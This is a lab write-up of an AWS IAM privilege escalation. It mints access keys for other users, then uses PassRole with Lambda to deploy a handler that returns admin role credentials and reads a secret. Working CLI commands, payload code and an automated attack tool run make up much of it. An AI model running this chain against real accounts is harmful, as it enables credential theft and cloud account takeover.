---
title: Mapper
categories: [HacksmarterLabs]
tags: [aws, iam, aws-lambda, passrole, privilege-escalation, secretsmanager]
media_subpath: /images/hacksmarter_mapper/
image:
  path: 'https://images.coursestack.com/d4c6b154-23be-44ee-b15b-4efb860e053f/b38e7594-09c7-470f-9269-11733449406d'
---

## Summary

**Mapper** is a HackSmarter AWS scenario. The starting position is a long-lived access key for the IAM user `cg-pentest-lab` in AWS account `223767249945`, and the goal is a flag held in AWS Secrets Manager that this user has no permission to read. The whole chain lives at the AWS control plane: no web application, no shell on a host, no exploit in the memory-corruption sense. Everything is a documented IAM API call that the account genuinely authorises.

The starter identity carries the AWS-managed `IAMReadOnlyAccess` policy plus a single inline policy that grants `iam:CreateAccessKey` on `arn:aws:iam::*:user/*`. That is total identity takeover of every IAM user in the account: an access key is a standalone, long-lived credential that needs no password, no MFA and no interaction from the victim. The catch, and the reason the box is called Mapper, is that the account contains **102 IAM users**, of which 100 are identical decoys holding nothing but `AmazonS3ReadOnlyAccess` and `AmazonEC2ReadOnlyAccess`. Enumerating them one API call at a time is hundreds of requests and a lot of wasted time. The intended move is to pull the entire IAM surface down in a single call with `iam:GetAccountAuthorizationDetails` and then filter it locally.

Two orthogonal `jq` filters both isolate the same user, `cg-lfgjvbxt-lab`: it is the only user besides ours with an inline policy, and it is the only user in the whole account with **no** attached managed policy. That user holds the three actions that compose into a role takeover:

- `lambda:CreateFunction`, which lets us deploy code and attach an execution role to it
- `iam:PassRole` scoped to `arn:aws:iam::223767249945:role/cg-LambdaAdminExecutionRole-lab`, which authorises attaching exactly that role
- `lambda:InvokeFunction`, which makes the code actually run

The Lambda runtime injects the execution role's temporary STS credentials into the function's process environment. Any code execution inside a Lambda is therefore equivalent to holding that role's credentials, and a four-line handler that returns `os.environ` is a complete exfiltration primitive. The passed role carries `AdministratorAccess`, so the returned `ASIA` triplet reads the secret directly.

The second half of the post walks the same account with [AWSPwn](https://github.com/mHijuxS/awspwn), an attack-path tool that enumerates IAM into a graph, runs Dijkstra from the caller to a synthetic `admin` node, and executes the chosen path with credential propagation between hops. It finds the same two-hop route without being told anything about the box, and it also produces two false-positive paths that are worth understanding, because they show exactly which part of IAM the graph model does not represent.

> **Category:** AWS / IAM privilege escalation. **Starting position:** long-lived access key for `cg-pentest-lab`. **Goal:** a Secrets Manager secret the starter identity cannot read. **Theme:** find one privileged principal inside a deliberate haystack, then turn `PassRole` plus a compute service into a role takeover.
{: .prompt-info }

---

## 1. Starting Position

The lab hands over an `AKIA` key pair. Write it to a named profile so nothing depends on ambient environment variables:

```bash
mkdir -p ~/.aws
cat > ~/.aws/credentials <<'EOF'
[mapper]
aws_access_key_id     = AKIA<REDACTED>
aws_secret_access_key = <REDACTED_SECRET_KEY>
EOF
cat > ~/.aws/config <<'EOF'
[profile mapper]
region = us-east-1
output = json
EOF
export AWS_PROFILE=mapper AWS_PAGER=""
```

`AWS_PAGER=""` matters more than it looks. AWS CLI v2 pipes JSON through `less` by default, which silently swallows output when you pipe into `jq` in a non-interactive context. The notes hit exactly this: a `list-secrets` call that printed nothing at all until it was re-run with `AWS_PAGER=''` in front of it.

The first call for any AWS credential is always the same, because `sts:GetCallerIdentity` cannot be denied by an identity policy and answers for any valid signature:

```bash
aws iam get-user
```

```json
{
    "User": {
        "Path": "/",
        "UserName": "cg-pentest-lab",
        "UserId": "AIDATIGMRIQMYTNCUNHS7",
        "Arn": "arn:aws:iam::223767249945:user/cg-pentest-lab",
        "CreateDate": "2026-08-31T01:31:14+00:00"
    }
}
```

The `AIDA` prefix on the `UserId` confirms this is an IAM user and not an assumed role, and the ARN gives us the account number `223767249945` that every later ARN has to match. The prefix table and the rest of the AWS control-plane groundwork used here live on the [AWS theory page](/theory/misc/aws).

---

## 2. Enumerating the Starter Identity

An IAM principal's permissions come from four places: attached managed policies, inline policies, group membership, and (for roles) the trust document. Check all of them before concluding anything.

```bash
aws iam list-attached-user-policies --user-name cg-pentest-lab
```

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "IAMReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMReadOnlyAccess"
        }
    ]
}
```

`IAMReadOnlyAccess` is the AWS-managed policy that grants `iam:Get*`, `iam:List*`, `iam:Simulate*` and the credential-report actions across the whole account. On a real engagement this is a gift: it means nothing about the IAM layout has to be guessed or brute-forced, because every user, role, policy and trust document is directly readable. It also means the account owner considered IAM metadata non-sensitive, which is the assumption this box is built to punish.

```bash
aws iam list-user-policies --user-name cg-pentest-lab
```

```json
{
    "PolicyNames": [
        "cg-pentest-create-access-key-lab"
    ]
}
```

`list-user-policies` returns names only. The document has to be fetched separately:

```bash
aws iam get-user-policy \
  --user-name cg-pentest-lab \
  --policy-name cg-pentest-create-access-key-lab
```

```json
{
    "UserName": "cg-pentest-lab",
    "PolicyName": "cg-pentest-create-access-key-lab",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "iam:CreateAccessKey",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::*:user/*"
            }
        ]
    }
}
```

One action, no condition, and a resource that is a double wildcard. `user/*` is every user in the account, and the `*` in the account field would extend it to any account where the key is presented, though in practice IAM only evaluates it against `223767249945`.

> **`iam:CreateAccessKey` on another user is a complete account takeover of that user, not a lesser form of it.** An access key is a first-class, standalone credential: it is long-lived, it is not tied to a console password, it does not trigger a password-change notification, and unless the victim's own policies carry an MFA condition it satisfies no MFA challenge because none is asked for. Minting one is a single unprivileged-looking API call that leaves the victim's existing credentials untouched and working, so nothing visibly breaks. The only ceiling is the `AccessKeysPerUser: 2` service quota, and users that have never been issued a key have both slots free.
{: .prompt-danger }

So the starter identity can become any of the account's users at will. That reframes the problem entirely: this is no longer "escalate `cg-pentest-lab`", it is "find the one user in this account worth becoming".

---

## 3. Mapping the Account

### 3.1 Why the obvious approach does not scale

```bash
aws iam list-users --query 'Users[].UserName' --output text | tr '\t' '\n' | wc -l
```

```
102
```

Every one of them matches `cg-<eight random letters>-lab`, except our own `cg-pentest-lab`. There is no naming hint, no `Path` grouping, and no tags. Working out what each can do the naive way means three calls per user (`list-attached-user-policies`, `list-user-policies`, `list-groups-for-user`) plus a `get-user-policy` for every inline policy name that comes back: over 300 API calls, each one a separate CloudTrail event, to answer a question IAM can answer once.

### 3.2 One call for the entire IAM surface

`iam:GetAccountAuthorizationDetails` returns every user, group, role and customer-managed policy in the account **with their policy documents already inlined**. It is the single highest-value read in the whole IAM API, and `IAMReadOnlyAccess` includes it.

```bash
aws iam get-account-authorization-details --filter User > accounts_detail.json
```

The `--filter` argument selects which object types to return (`User`, `Group`, `Role`, `LocalManagedPolicy`, `AWSManagedPolicy`). It is worth knowing both forms:

- With `--filter User`, the response still contains all four top-level keys (`UserDetailList`, `GroupDetailList`, `RoleDetailList`, `Policies`), but the three unselected ones come back as empty arrays. That is a real trap when you later `jq` for a role and find nothing: the emptiness is your filter, not the account.
- Dropping `--filter` entirely returns roles and their trust documents in the same pass, which is how the target role's `AdministratorAccess` attachment can be spotted before ever touching it.

The call is paginated (`IsTruncated` / `Marker`), and the AWS CLI follows the pages automatically unless you constrain it with `--max-items`. The result here is a 75 KB file describing the whole account.

> **Prefer one authoritative read over many small ones.** Beyond the obvious speed argument, `GetAccountAuthorizationDetails` gives you a consistent snapshot you can re-query offline as many times as you like, without generating a single further CloudTrail event. Detection engineers watch for enumeration *volume*; this call is one event.
{: .prompt-tip }

### 3.3 Filter one: who has an inline policy

Managed policies are shared and reusable, so a per-user inline policy is almost always bespoke, and bespoke is where the interesting permissions live. `UserPolicyList` is absent entirely on users that have none, so `select(.UserPolicyList != null)` is the right test:

```bash
jq '.UserDetailList[]
    | select(.UserPolicyList != null)
    | {User: .UserName, Policies: .UserPolicyList}' accounts_detail.json
```

```json
{
  "User": "cg-lfgjvbxt-lab",
  "Policies": [
    {
      "PolicyName": "cg-lambda-developer-policy-lab",
      "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
          {
            "Action": [
              "lambda:CreateFunction",
              "lambda:InvokeFunction"
            ],
            "Effect": "Allow",
            "Resource": "*"
          },
          {
            "Action": "iam:PassRole",
            "Effect": "Allow",
            "Resource": "arn:aws:iam::223767249945:role/cg-LambdaAdminExecutionRole-lab"
          }
        ]
      }
    }
  ]
}
{
  "User": "cg-pentest-lab",
  "Policies": [
    {
      "PolicyName": "cg-pentest-create-access-key-lab",
      "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
          {
            "Action": "iam:CreateAccessKey",
            "Effect": "Allow",
            "Resource": "arn:aws:iam::*:user/*"
          }
        ]
      }
    }
  ]
}
```

Two hits out of 102, one of which is ourselves. `cg-lfgjvbxt-lab` is the target.

### 3.4 Filter two: the shape of the noise

It is worth confirming the finding from the other direction, because a single filter that lands on exactly the right answer is often a filter that got lucky. Count the managed policies:

```bash
jq -r '.UserDetailList[].AttachedManagedPolicies[]?.PolicyName' accounts_detail.json \
  | sort | uniq -c | sort -rn
```

```
    100 AmazonS3ReadOnlyAccess
    100 AmazonEC2ReadOnlyAccess
      1 IAMReadOnlyAccess
```

100 users share an identical pair of read-only policies, one user (ours) has `IAMReadOnlyAccess`, and the arithmetic leaves one user unaccounted for. Invert the filter:

```bash
jq -r '.UserDetailList[]
       | select((.AttachedManagedPolicies | length) == 0)
       | .UserName' accounts_detail.json
```

```
cg-lfgjvbxt-lab
```

The same user, reached by asking the opposite question. `cg-lfgjvbxt-lab` is the only principal in the account whose permissions are *entirely* bespoke, which is precisely why it is the one that matters.

> **The decoys are the mechanism, not scenery.** 100 users with identical harmless policies exist to make per-user enumeration expensive enough that you abandon it, and to make an eyeball scan of `list-users` useless. Once the data is local, both the outlier and the population are one `jq` expression away. The lesson generalises past this box: pull the whole authorisation surface, then look for what is *different*, not for what looks dangerous.
{: .prompt-tip }

---

## 4. The `PassRole` Primitive

Before running anything, it is worth being precise about why those three actions compose, because `iam:PassRole` is the most commonly misread action in IAM.

**`PassRole` is not `AssumeRole`.** Holding `iam:PassRole` on a role gives you none of that role's permissions and no credentials for it. What it does is authorise you to *hand the role's ARN to an AWS service* during a create call. The service then assumes the role itself, using the role's trust policy, and runs your workload under it. `PassRole` exists purely as a guardrail on that handoff: without it, anyone who could create a Lambda, an EC2 instance or an ECS task could attach the most privileged role in the account to it.

The consequence is that `PassRole` is only ever dangerous in combination. On its own it is inert. Paired with a compute service that runs attacker-supplied code, it becomes a full role takeover, and there are many such pairings:

| Service action paired with `iam:PassRole` | How the code gets in |
|---|---|
| `lambda:CreateFunction` + `lambda:InvokeFunction` | Function deployment package |
| `ec2:RunInstances` | Instance user-data script |
| `ecs:RunTask` | Container image and command |
| `cloudformation:CreateStack` | Template with a custom resource |
| `glue:CreateDevEndpoint` | Notebook attached to the endpoint |
| `sagemaker:CreateNotebookInstance` | Notebook cell |
| `codebuild:CreateProject` + `codebuild:StartBuild` | Buildspec |

`cg-lfgjvbxt-lab` has the first row, and its `PassRole` resource is a single specific ARN rather than `*`, which is exactly how the guardrail is meant to be written. The scoping is correct; the problem is what is on the other end of it.

**Why running code inside Lambda equals holding the role.** The Lambda execution environment obtains temporary credentials for the execution role and exposes them to the function process as ordinary environment variables: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `AWS_SESSION_TOKEN`. This is how the AWS SDKs inside a function pick up their identity with no configuration. It also means a handler that does nothing but read `os.environ` and return it is a complete credential-theft payload, and `InvokeFunction` with a synchronous (`RequestResponse`) invocation returns the handler's value straight to the caller.

> There is no exploit here in the vulnerability sense. Every step is the documented, intended behaviour of Lambda and IAM. The finding is entirely one of policy design: a role carrying `AdministratorAccess` was made passable to a compute service by a non-administrative user.
{: .prompt-info }

---

## 5. Executing the Chain

### 5.1 Mint an access key for the target user

```bash
aws iam create-access-key --user-name cg-lfgjvbxt-lab
```

```json
{
    "AccessKey": {
        "UserName": "cg-lfgjvbxt-lab",
        "AccessKeyId": "AKIA<REDACTED>",
        "SecretAccessKey": "<REDACTED_SECRET_KEY>",
        "Status": "Active",
        "CreateDate": "2026-08-31T02:17:18+00:00"
    }
}
```

This is the only time AWS will ever show the secret half of the key, so it has to be captured now. Save it as a second profile and switch:

```bash
cat >> ~/.aws/credentials <<'EOF'

[lambda-dev]
aws_access_key_id     = AKIA<REDACTED>
aws_secret_access_key = <REDACTED_SECRET_KEY>
EOF
export AWS_PROFILE=lambda-dev
aws sts get-caller-identity
```

```json
{
    "UserId": "AIDATIGMRIQMZQD37APJ4",
    "Account": "223767249945",
    "Arn": "arn:aws:iam::223767249945:user/cg-lfgjvbxt-lab"
}
```

> IAM is eventually consistent. A freshly minted access key can fail with `InvalidClientTokenId` for a few seconds before it propagates to the endpoint you are calling, and the same applies to a policy you have just attached. If the first call after a `create-access-key` fails, wait and retry once before assuming the key is wrong.
{: .prompt-warning }

### 5.2 The payload

```python
import os
import json

def handler(event, context):
    aws_access_key = os.environ.get('AWS_ACCESS_KEY_ID')
    aws_secret_key = os.environ.get('AWS_SECRET_ACCESS_KEY')
    aws_session_token = os.environ.get('AWS_SESSION_TOKEN')

    credentials = {
    "AcessKeyId": aws_access_key,
    "SecretAccessKey": aws_secret_key,
    "SessionToken": aws_session_token
    }

    return {
        'statusCode': 200,
        'body': json.dumps(credentials)
    }
```

Three environment reads and a JSON dump. The function needs no imports beyond the standard library, so the deployment package is a single file with no dependencies to vendor. The `statusCode` / `body` shape is the API Gateway proxy response convention; nothing here requires it, but it is what the return value ends up nested in, which is why the response has to be unwrapped twice later.

Lambda expects a zip archive, not a bare file:

```bash
zip privesc.zip privesc.py
```

```
updating: privesc.py (deflated 46%)
```

### 5.3 Deploy the function with the admin role attached

```bash
aws lambda create-function \
  --function-name exploit \
  --role "arn:aws:iam::223767249945:role/cg-LambdaAdminExecutionRole-lab" \
  --region us-east-1 \
  --handler privesc.handler \
  --zip-file fileb://privesc.zip \
  --runtime python3.11
```

Each flag earns its place:

- `--role` is the `PassRole` moment. The service validates that our caller is allowed to pass this specific ARN, then stores it as the function's execution role.
- `--handler privesc.handler` is `<module>.<function>`: the file `privesc.py` inside the zip, and the `handler` symbol within it. A mismatch here produces a runtime `Unable to import module` error rather than a create-time failure.
- `--zip-file fileb://` uploads the archive inline. The `fileb://` scheme (rather than `file://`) tells the CLI to read the file as binary; `file://` would try to interpret it as text and corrupt it.
- `--runtime python3.11` selects a managed runtime, so nothing has to be built or containerised.

```json
{
    "FunctionName": "exploit",
    "FunctionArn": "arn:aws:lambda:us-east-1:223767249945:function:exploit",
    "Runtime": "python3.11",
    "Role": "arn:aws:iam::223767249945:role/cg-LambdaAdminExecutionRole-lab",
    "Handler": "privesc.handler",
    "CodeSize": 414,
    "Timeout": 3,
    "MemorySize": 128,
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip"
}
```

Note `"State": "Pending"`. `create-function` returns before the function is invocable, and invoking too early fails with `ResourceConflictException: The operation cannot be performed at this time. The function is currently in the following state: Pending`. That is a timing artefact, not a permissions problem, and the fix is to wait a couple of seconds or poll:

```bash
aws lambda wait function-active --function-name exploit --region us-east-1
```

### 5.4 Invoke and unwrap

```bash
aws lambda invoke --function-name exploit response.json --region us-east-1
```

```json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

The `StatusCode` here is the HTTP status of the *invocation*, not of the handler. A handler that raised an exception would still return `200` with a `FunctionError` field alongside it, so this response says only that the function ran. The interesting part went to the output file.

The handler's return value is JSON, and its `body` is itself a JSON string, so it needs unwrapping twice: `jq '.body' -r` extracts the raw string, and the second `jq` parses it.

```bash
jq -r '.body' response.json | jq '.'
```

```json
{
  "AcessKeyId": "ASIA<REDACTED>",
  "SecretAccessKey": "<REDACTED_SECRET_KEY>",
  "SessionToken": "<REDACTED_SESSION_TOKEN>"
}
```

The `ASIA` prefix confirms these are STS temporary credentials rather than an IAM user key, which means the session token is mandatory. Export all three and drop the profile, since `AWS_PROFILE` takes precedence over loose environment variables in some resolution orders and is the usual reason a pasted triplet appears not to work:

```bash
unset AWS_PROFILE
export AWS_ACCESS_KEY_ID="ASIA<REDACTED>"
export AWS_SECRET_ACCESS_KEY="<REDACTED_SECRET_KEY>"
export AWS_SESSION_TOKEN="<REDACTED_SESSION_TOKEN>"
aws sts get-caller-identity
```

```json
{
    "UserId": "AROATIGMRIQMY4TCEILMW:exploit",
    "Account": "223767249945",
    "Arn": "arn:aws:sts::223767249945:assumed-role/cg-LambdaAdminExecutionRole-lab/exploit"
}
```

Three things in that response confirm the takeover. The `arn:aws:sts:` service prefix instead of `arn:aws:iam:` marks a temporary session. The `assumed-role/<role>/<session>` form names the role we are now operating as. The `AROA` prefix on the `UserId` is the role's unique ID, and the `:exploit` suffix is the session name, which Lambda derives from the function name.

### 5.5 Confirm what the role is worth

The starter identity still holds `IAMReadOnlyAccess`, so the role's power can be read from the original profile, and in fact could have been read back in section 3 by dropping `--filter User`:

```bash
AWS_PROFILE=mapper aws iam list-attached-role-policies \
  --role-name cg-LambdaAdminExecutionRole-lab
```

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

`AdministratorAccess` is `Action: "*"` on `Resource: "*"`. There is nothing left to escalate to.

---

## 6. Reading the Secret

```bash
aws secretsmanager list-secrets --region us-east-1
```

```json
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:223767249945:secret:cg-admin-flag-lab-00Mpab",
            "Name": "cg-admin-flag-lab",
            "Description": "Administrative access verification flag",
            "LastChangedDate": "2026-08-30T21:31:19.326000-04:00",
            "LastAccessedDate": "2026-08-30T20:00:00-04:00",
            "SecretVersionsToStages": {
                "terraform-bqt9f5Q6KO4pfQj6DnHamLY9PU": [
                    "AWSCURRENT"
                ]
            }
        }
    ]
}
```

The six-character suffix on the ARN (`-00Mpab`) is generated by Secrets Manager at creation time and is not predictable, which is why `list-secrets` is a necessary step rather than a convenience: `get-secret-value` accepts the friendly `Name` too, but only for secrets in the current account and region, and the full ARN is what removes all ambiguity.

```bash
aws secretsmanager get-secret-value \
  --region us-east-1 \
  --secret-id arn:aws:secretsmanager:us-east-1:223767249945:secret:cg-admin-flag-lab-00Mpab
```

```json
{
    "ARN": "arn:aws:secretsmanager:us-east-1:223767249945:secret:cg-admin-flag-lab-00Mpab",
    "Name": "cg-admin-flag-lab",
    "VersionId": "terraform-bqt9f5Q6KO4pfQj6DnHamLY9PU",
    "SecretString": "HSM{redacted}",
    "VersionStages": [
        "AWSCURRENT"
    ]
}
```

> **This is the cheapest step in the chain to detect.** `GetSecretValue` writes a CloudTrail event carrying the secret ARN, the calling principal and the source IP, and it bumps the secret's `LastAccessedDate`. It does not log the secret value. A Lambda execution role reading an administrative secret from an operator's IP, in a session named after a function created ninety seconds earlier, is a low-noise, high-confidence alert. So is the pair that precedes it: `CreateAccessKey` where the caller and the `userName` request parameter differ, followed by `CreateFunction` from the newly minted key.
{: .prompt-danger }

---

## 7. Automating It: AWSPwn

Everything above is a graph problem in disguise. Nodes are principals; an edge from A to B means "holding A, there is an API call that yields B's credentials or privileges". `CreateAccessKey` is an edge from `cg-pentest-lab` to each of the other 101 users. `CreateLambdaWithRole` is an edge from `cg-lfgjvbxt-lab` to the roles it can pass. Finding the chain is then a shortest-path search, which is the same insight BloodHound applies to Active Directory.

[AWSPwn](https://github.com/mHijuxS/awspwn) implements that for AWS: it enumerates IAM and regional resources into a graph, scores each edge by blast radius, runs Dijkstra from the caller to a synthetic `admin` node, and then walks the chosen path in-process with boto3, propagating credentials from one hop to the next.

### 7.1 One command, end to end

```bash
awspwn pwn --execute
```

```

    _    _    _  ___ ___
   /_\  | |  | |/ __| _ \_ __ ___ _ _
  / _ \ | |/\| |\__ \  _/ V V / ' \
 /_/ \_\|__/\__||___/_|  \_/\_/|_||_|

  version 0.1.0   phase-3 exploitation - mutates the account
  automated exploitation - credential propagation + rollback ledger

  [*] no saved graph - collecting fresh (enum)...

  [+] authenticated as arn:aws:iam::223767249945:user/cg-pentest-lab
  [*] account 223767249945
  [*] sweeping 8 region(s)
  [*] running 10 enumerator(s)...


  Paths from cg-pentest-lab:

    1. (cost 4, 2 hop) -> cg-LambdaAdminExecutionRole-lab
        CreateAccessKey -> CreateLambdaWithRole
    2. (cost 4, 2 hop) -> CourseStackAwsLabRole
        CreateAccessKey -> CreateLambdaWithRole
    3. (cost 4, 2 hop) -> OrganizationAccountAccessRole
        CreateAccessKey -> CreateLambdaWithRole
    4. (cost 6, 3 hop) -> admin
        CreateAccessKey -> CreateLambdaWithRole -> EffectiveAdmin

  Select a path [1-4] (q to quit): 1
```

The enumeration step is the same `GetAccountAuthorizationDetails` call from section 3.2, with a documented fallback chain: if that call is denied it drops to per-object `List*`/`Get*`, and if IAM read is denied entirely it probes the caller's effective permissions empirically. On this account the first tier succeeds, so the whole 102-user, 10-role graph comes from one API call.

The costs are worth reading rather than skipping. Edge cost is a base weight plus a blast-radius surcharge: high-value identity edges such as `CreateAccessKey` and `CreateLambdaWithRole` have base 1, and a `MUTATE` blast radius adds 1, giving 2 per hop and `cost 4` for a two-hop path. The surcharge is what makes the ranking useful: `DESTRUCTIVE` and `EXTERNAL_EXPOSURE` edges add 3 instead of 1, so the search prefers the quietest route to admin rather than merely the shortest one.

Path 4 is the same chain with one more edge: `EffectiveAdmin` is a synthetic edge drawn from any principal whose effective policy is wildcard-admin to a synthetic `admin` goal node, which is how "did we win" gets expressed as a graph query.

Of the four, **only path 1 belongs to the Mapper scenario.** It is the one that ends on `cg-LambdaAdminExecutionRole-lab`, the role the lab actually built and the one `cg-lfgjvbxt-lab` is genuinely allowed to pass. Paths 2 and 3 point at `CourseStackAwsLabRole` and `OrganizationAccountAccessRole`, which are CourseStack platform-management roles present in every lab account and no part of this challenge, and, as section 7.3 shows, not reachable at all: the target user's `iam:PassRole` is scoped to the one lab role, so attempting either would fail at `create-function`. Path 4 reaches the synthetic `admin` node only by routing through those same admin-equivalent roles, so it is not a distinct win either. The four entries look interchangeable ranked by cost precisely because the graph scores edges by action, not by the resource ARN each action is scoped to; picking path 1 requires reading the policy, not the cost column, which is the subject of section 7.3.

### 7.2 The walk

```
  -- hop 1/2: CreateAccessKey -> cg-iieozgms-lab  [MUTATE]
    [+] saved access key AKIA<REDACTED> for cg-iieozgms-lab to loot
  [+] now: arn:aws:iam::223767249945:user/cg-iieozgms-lab

  -- hop 2/2: CreateLambdaWithRole -> cg-LambdaAdminExecutionRole-lab  [MUTATE]
    [+] deployed awspwn-exploit-bd9c76d0 as arn:aws:iam::223767249945:role/cg-LambdaAdminExecutionRole-lab
    function still initializing... (try 1)
    [cleanup] deleted awspwn-exploit-bd9c76d0 (as captured role)
    [+] captured credentials for arn:aws:iam::223767249945:role/cg-LambdaAdminExecutionRole-lab
  [+] now: arn:aws:iam::223767249945:role/cg-LambdaAdminExecutionRole-lab

------------------------------------------------------------------------------
  Result: REACHED GOAL   2/2 hop(s)   final identity: arn:aws:iam::223767249945:role/cg-LambdaAdminExecutionRole-lab
  Mutations recorded: 2  (awspwn rollback to undo)
  Captured credentials (secrets saved 0600 -> /home/user/Ctf/Hacksmarter/Mapper/awspwn-loot/captured-creds.jsonl):
    * arn:aws:iam::223767249945:user/cg-iieozgms-lab  (create-access-key)  key AKIA<REDACTED>
    * arn:aws:iam::223767249945:role/cg-LambdaAdminExecutionRole-lab  (lambda-exec)  key ASIA<REDACTED>
```

This was a fresh deployment of the lab, so the randomised username is `cg-iieozgms-lab` rather than `cg-lfgjvbxt-lab`; the role name and the account are fixed by the scenario, the eight random letters are not. The tool never had the username handed to it either way, which is the point: the same graph query that ranks paths also identifies which of the 101 `CreateAccessKey` edges leads anywhere.

Three details in that output map back to the manual walkthrough:

- `function still initializing... (try 1)` is the `State: Pending` race from section 5.3, handled by retrying rather than by a fixed sleep.
- `[cleanup] deleted awspwn-exploit-bd9c76d0 (as captured role)` deletes the deployed function using the *captured* role's own credentials rather than the creating user's. The creating user only ever had `CreateFunction` and `InvokeFunction`, not `DeleteFunction`, so cleaning up as the newly acquired admin role is the only way the artefact can be removed at all.
- `Mutations recorded: 2` is a ledger. `awspwn rollback` replays it last-in-first-out to delete the created access key and remove anything else the run left behind, which matters on an engagement where the deliverable includes proving the account was returned to its prior state.

### 7.3 Where the graph model overstates the account

Paths 2 and 3 offered `CourseStackAwsLabRole` and `OrganizationAccountAccessRole` as `CreateLambdaWithRole` targets. They are not reachable. The real inline policy scopes `iam:PassRole` to one ARN:

```json
{
    "Action": "iam:PassRole",
    "Effect": "Allow",
    "Resource": "arn:aws:iam::223767249945:role/cg-LambdaAdminExecutionRole-lab"
}
```

Attempting path 2 or 3 would fail at `create-function` with `AccessDenied` on `iam:PassRole`. The cause is visible in the tool's own source: the edge builder matches on *action patterns* and treats the target selector as best-effort, drawing an edge to every non-service-linked role in the account.

```python
elif selector in ("passable_roles", "assumable_roles"):
    # Best-effort: target any non-service-linked role. Resource
    # scoping on PassRole is refined by simulate.py; here we surface
    # the candidate paths. Service-linked roles are excluded - they
    # cannot be passed to arbitrary compute or assumed by a user.
```

The graph stores which actions a principal holds, not the resource ARNs those actions are scoped to, so `iam:PassRole` present anywhere in a policy becomes an edge to every plausible role. That is a deliberate recall-over-precision trade: a missed edge is a missed attack path, whereas a false edge costs one failed API call. Service-linked roles are excluded because they genuinely cannot be passed to arbitrary compute, which is why the seven `AWSServiceRoleFor*` roles in this account never appear as candidates.

> **Every attack-path tool over-approximates somewhere, and knowing where is the difference between using one and trusting one.** BloodHound's AD collectors do the same thing with ACEs whose effect depends on runtime state. When a graph tool offers you three interchangeable-looking paths, read the underlying policy for the one you intend to run rather than picking by cost, and treat the ranking as a search-order hint instead of a claim of feasibility.
{: .prompt-warning }

### 7.4 Loading the captured credentials

The loot store keeps captured credentials as JSONL at mode `0600`, and `--export` renders one of them as shell assignments:

```bash
awspwn loot --export cg-LambdaAdminExecutionRole-lab
```

```
export AWS_ACCESS_KEY_ID=ASIA<REDACTED>
export AWS_SECRET_ACCESS_KEY=<REDACTED_SECRET_KEY>
export AWS_SESSION_TOKEN=<REDACTED_SESSION_TOKEN>
# awspwn: loaded role-creds for cg-LambdaAdminExecutionRole-lab (account 223767249945) [session token - ephemeral; re-capture if expired]
```

These have to be evaluated by the current shell, not run as a command:

```bash
eval "$(awspwn loot --export cg-LambdaAdminExecutionRole-lab)"
```

Then the last two calls are identical to section 6, against a freshly deployed instance of the lab whose secret carries a different ARN suffix but the same value:

```bash
AWS_PAGER='' aws secretsmanager list-secrets --region us-east-1
AWS_PAGER='' aws secretsmanager get-secret-value \
  --region us-east-1 \
  --secret-id arn:aws:secretsmanager:us-east-1:223767249945:secret:cg-admin-flag-lab-A47va3
```

```json
{
    "Name": "cg-admin-flag-lab",
    "VersionId": "terraform-uGRAhs8Oje22oV8SufvxYzLmsC",
    "SecretString": "HSM{redacted}",
    "VersionStages": [
        "AWSCURRENT"
    ]
}
```

Same flag, four minutes of manual work replaced by one command and a menu selection.

---

## Understanding the Attack Chain

Not one step in this chain is a bug. Every call is an AWS API behaving exactly as documented, invoked by a principal the account explicitly authorised. The compromise is entirely in the arrangement, and the table below separates what each piece is worth on its own from what it is worth in sequence.

| Primitive | Where it lives | Severity in isolation | Severity composed |
|---|---|---|---|
| `IAMReadOnlyAccess` | `cg-pentest-lab`, managed | Low: metadata only, no writes | Publishes the whole attack graph for free |
| `iam:CreateAccessKey` on `user/*` | `cg-pentest-lab`, inline | Critical: takeover of any user | Becomes the first hop of the chain |
| 100 decoy users, identical policies | Account layout | None: harmless read-only | Makes per-user enumeration a dead end |
| `GetAccountAuthorizationDetails` | AWS IAM API | Low: one read call | Collapses 300+ calls into one snapshot |
| Bespoke inline policy on one user | `cg-lfgjvbxt-lab` | Medium: a developer's permissions | The single outlier every filter lands on |
| `iam:PassRole`, correctly scoped | `cg-lfgjvbxt-lab`, inline | None on its own: no credentials | Authorises attaching the admin role |
| `lambda:CreateFunction` | `cg-lfgjvbxt-lab`, inline | Low: deploy code | Supplies the code that runs as the role |
| `lambda:InvokeFunction` | `cg-lfgjvbxt-lab`, inline | Low: run a function | Turns deployment into execution |
| Role creds in the runtime environment | Lambda by design | None: how SDKs authenticate | Four lines of Python exfiltrate them |
| `AdministratorAccess` on a passable role | `cg-LambdaAdminExecutionRole-lab` | Critical, but "only" for Lambda | The whole account, for a developer |
| `secretsmanager:GetSecretValue` | Inherited via the role | Normal application design | The final read |
